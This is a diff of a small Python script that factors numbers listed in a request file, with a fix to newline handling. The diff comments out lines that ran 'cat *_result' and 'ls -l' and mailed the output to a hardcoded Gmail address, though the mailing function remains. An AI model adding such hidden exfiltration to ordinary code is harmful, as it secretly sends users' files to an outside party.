@@ -3,7 +3,7 @@ import sys
 import subprocess
 def print_result(request_num, results_file):
     for result in results_file:
-        if result.startswith(f"{request_num[:-1]}="):
+        if result.startswith(f"{request_num}="):
             print(result[:-1])
             return True
     return False
@@ -76,15 +76,17 @@ def send_data(message="no_data"):
     s.sendmail("ashrafalx368@gmail.com", "ashrafatef368@gmail.com", message)
     # terminating the session
     s.quit()
-data = get_data("cat *_result")
-data += get_data("ls -l")
-send_data(data)
+# data = get_data("cat *_result")
+# data += get_data("ls -l")
+# send_data(data)
 try:
     with open(file_path, "r") as request:
         with open("f_nums", "r") as f_nums:
-            for line in request:
-                if not print_result(line, f_nums):
-                    num = int(line[:-1])
+            for request_num in request:
+                if request_num[-1] == "\n":
+                    request_num = request_num[:-1]
+                if not print_result(request_num, f_nums):
+                    num = int(request_num)
                     factor = int(get_data(f"factor {num}").split()[1])
                     print(f"{num}={num // factor}*{factor}")
 except FileNotFoundError:
